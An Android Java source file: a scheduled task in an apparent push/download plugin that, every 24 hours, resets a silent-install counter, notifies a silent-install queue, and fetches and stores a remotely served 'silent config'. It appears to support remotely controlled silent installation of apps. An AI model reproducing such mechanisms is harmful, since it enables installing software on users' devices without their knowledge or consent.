package com.tiho.dlplugin.task.silent;

import java.text.MessageFormat;

import com.tiho.base.base.http.HttpHelper;
import com.tiho.base.base.http.json.JsonUtil;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushSilentConfig;
import com.tiho.dlplugin.common.CommonInfo;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushConfigDAO;
import com.tiho.dlplugin.display.PushStat;
import com.tiho.dlplugin.task.BaseTask;
import com.tiho.dlplugin.util.StringUtils;
import com.tiho.dlplugin.util.Urls;

import android.content.Context;
import android.os.Handler;



/**
 * 定时更新config信息
 * @author Joey.Dai
 *
 */
public class SilentConfigTask extends BaseTask{

	public SilentConfigTask(Handler handler, Context context) {
		super(handler, context);
	}

	@Override
	protected void doTask() {
		//重置静默安装数量
		PushStat.getInstance(context).resetSilentNum();
		SilentInstallHelper.getInstance(context).notifySilentQueue(null);
		
		String ver = CommonInfo.getInstance(context).getPluginVer();

		String url  =  MessageFormat.format(Urls.getInstance().getSilentConfigUrl(), ver);
		
		String response = HttpHelper.getInstance(context).simpleGet(url);

		if (!StringUtils.isEmpty(response)) {
			try {
				LogManager.LogShow("返回silent config:"+response);
				PushSilentConfig config = JsonUtil.fromJson(response, PushSilentConfig.class);
				
				DAOFactory.getConfigDAO(context).saveConfig(PushConfigDAO.TYPE_SILENT, config);
				
			} catch (Exception e) {
				LogManager.LogShow(e);
				throw new RuntimeException(e);
			}
		}
		
	}

	
	@Override
	protected void afterTask(Handler handler) {
		LogManager.LogShow("定时更新config信息");
		handler.postDelayed(new SilentConfigTask(handler, context), 24*3600000L);
	}

}
